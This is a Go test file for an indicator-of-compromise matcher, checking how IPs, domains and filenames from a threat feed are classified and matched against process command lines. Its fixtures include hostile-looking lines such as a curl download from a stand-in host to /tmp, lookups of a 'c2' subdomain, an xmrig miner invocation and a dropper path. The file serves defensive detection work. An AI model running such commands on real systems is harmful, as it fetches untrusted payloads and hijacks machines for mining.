package ioc

import (
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/event"
)

func TestClassify(t *testing.T) {
	cases := []struct {
		in   string
		want Kind
	}{
		{"192.0.2.1", KindIP},
		{"10.0.0.255", KindIP},
		{"dead:beef::1", KindIP},
		{"evil.example", KindDomain},
		{"c2.bad-domain.test", KindDomain},
		{"xmrig", KindFilename},
		{"/usr/bin/xmrig", KindFilename},
		{"/tmp/loot.tgz", KindFilename}, // a slash forces filename, resolving the dotted-name ambiguity
	}
	for _, c := range cases {
		if got := classify(c.in); got != c.want {
			t.Errorf("classify(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}

func TestSetMatch(t *testing.T) {
	s := NewSet()
	s.Read(strings.NewReader(`# a feed
192.0.2.1
evil.example
xmrig
/opt/evil/dropper
`), "feed.txt")

	cases := []struct {
		name  string
		ev    event.Event
		want  []string // indicator values expected to fire (any order)
		field string
	}{
		{
			name: "ip literal in command line",
			ev:   event.Event{CommandLine: "curl http://192.0.2.1/x -o /tmp/y"},
			want: []string{"192.0.2.1"},
		},
		{
			name: "domain exact host",
			ev:   event.Event{CommandLine: "curl https://evil.example/path"},
			want: []string{"evil.example"},
		},
		{
			name: "domain dot-suffix matches subdomain",
			ev:   event.Event{CommandLine: "nslookup c2.evil.example"},
			want: []string{"evil.example"},
		},
		{
			name: "domain must not match a non-suffix lookalike",
			ev:   event.Event{CommandLine: "curl https://notevil.example/"},
			want: nil,
		},
		{
			name: "filename substring in command line",
			ev:   event.Event{CommandLine: "/tmp/xmrig --donate 0"},
			want: []string{"xmrig"},
		},
		{
			name: "filename path substring",
			ev:   event.Event{CommandLine: "cp a /opt/evil/dropper"},
			want: []string{"/opt/evil/dropper"},
		},
		{
			name: "no hit on benign",
			ev:   event.Event{CommandLine: "git status"},
			want: nil,
		},
		{
			name: "ip not matched as a loose substring of a bigger number",
			ev:   event.Event{CommandLine: "echo 192.0.2.100"},
			want: nil, // 192.0.2.100 is a different token than 192.0.2.1
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := s.Match(c.ev)
			var vals []string
			for _, m := range got {
				vals = append(vals, m.Indicator.Value)
			}
			if !sameSet(vals, c.want) {
				t.Errorf("Match() indicators = %v, want %v", vals, c.want)
			}
		})
	}
}

func TestSetMatchDedupesAndTagsField(t *testing.T) {
	s := NewSet()
	s.Add("xmrig", "feed.txt")
	// Same indicator in two fields -> two matches, each tagged its field.
	ev := event.Event{Image: "/tmp/xmrig", CommandLine: "xmrig --foo"}
	got := s.Match(ev)
	if len(got) != 2 {
		t.Fatalf("got %d matches, want 2 (one per field)", len(got))
	}
	fields := map[string]bool{}
	for _, m := range got {
		fields[m.Field] = true
	}
	if !fields["Image"] || !fields["CommandLine"] {
		t.Errorf("expected hits in both Image and CommandLine, got %v", fields)
	}
}

func TestReadSkipsCommentsAndBlanks(t *testing.T) {
	s := NewSet()
	s.Read(strings.NewReader("# comment\n\n   \n192.0.2.9\n"), "f")
	if s.Len() != 1 {
		t.Errorf("Len() = %d, want 1 (comments/blanks skipped)", s.Len())
	}
}

func sameSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	m := map[string]int{}
	for _, x := range a {
		m[x]++
	}
	for _, x := range b {
		m[x]--
	}
	for _, v := range m {
		if v != 0 {
			return false
		}
	}
	return true
}
